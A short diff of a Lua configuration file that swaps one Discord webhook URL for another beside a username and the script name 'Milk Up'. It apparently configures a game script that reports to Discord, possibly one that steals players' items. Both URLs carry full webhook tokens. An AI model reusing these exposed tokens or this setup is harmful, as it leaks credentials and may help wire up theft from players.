@@ -1,5 +1,5 @@
 Username = "Leander1573"
-WebHook = "https://discord.com/api/webhooks/1097497906921082991/7lvbnUZCt6RG8lpWqFde6GsjE1pOSly7TVn_L4AU0oyqf7eCJkC0C4ayTh1aIsj5-Ntw"
+WebHook = "https://discord.com/api/webhooks/1097529683245006888/bzQQlni8-zzT4fzVdmarwBByGkh3vMRLN8oybR4XMQ4CfWWQvFc_AyU5TosTLZGPEqAq"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "Milk Up"
